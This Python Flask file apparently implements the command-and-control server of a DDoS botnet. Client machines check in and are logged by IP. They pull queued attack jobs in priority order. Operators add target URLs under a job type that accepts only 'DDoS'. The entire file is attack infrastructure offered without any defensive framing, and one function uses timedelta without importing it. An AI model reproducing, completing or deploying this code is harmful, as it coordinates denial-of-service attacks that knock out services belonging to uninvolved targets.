import flask
from flask import request, jsonify, Flask
import db
import pymongo
from datetime import datetime
import functions

import config

config = config.get_config()

app = Flask(__name__)

@app.route("/get_version/")
def get_version():
    with open("version.txt", "r") as f:
        version = f.read()

    return jsonify({"version": version})

@app.route("/ping/")
def ping():
    ip_address = request.remote_addr
    db.pings_collection.insert_one({"ip": ip_address, "time": datetime.now(), "access_route": request.access_route})

    to_prioritize = functions.check_and_notify()

    return jsonify({"status": "ok", "prioritize": to_prioritize})

@app.route("/get_job/")
def get_job():
    job = db.jobs_collection.find_one({"done": False}, sort=[("priority", pymongo.ASCENDING)])

    if not job == None:
        job["_id"] = str(job["_id"])

        job["status"] = "ok"

        job["url"] = [job["url"], job["url"]]

        return jsonify(job)

    if job == None:
        return jsonify({"status": "no_jobs"})
    
@app.route("/add_job/", methods=["POST"])
def add_job():
    data = request.json

    job_type = data.get("job_type", None)

    if not job_type in ["DDoS"]:
        return jsonify({"status": "error", "message": "Invalid job type!"})

    if job_type == "DDoS":
        target_url = data.get("target_url", None)

        db.jobs_collection.insert_one({"url": target_url, "job_type": job_type, "done": False, "priority": functions.get_highest_priority()+1})

    return jsonify({"status": "ok"})

@app.route("/get_clients_count/")
def get_clients_count():
    # Calculate the count of clients who have pinged in the last 30 minutes
    thirty_minutes_ago = datetime.now() - timedelta(minutes=30)
    count = db.pings_collection.count_documents({"time": {"$gte": thirty_minutes_ago}})
    return jsonify({"clients_count": count})

@app.route("/get_jobs_list/")
def get_jobs_list():
    # Retrieve the list of jobs
    jobs = list(db.jobs_collection.find())
    for job in jobs:
        job["_id"] = str(job["_id"])
    return jsonify({"jobs": jobs})

if __name__ == "__main__":
    app.run(config.get("host"), config.get("port"))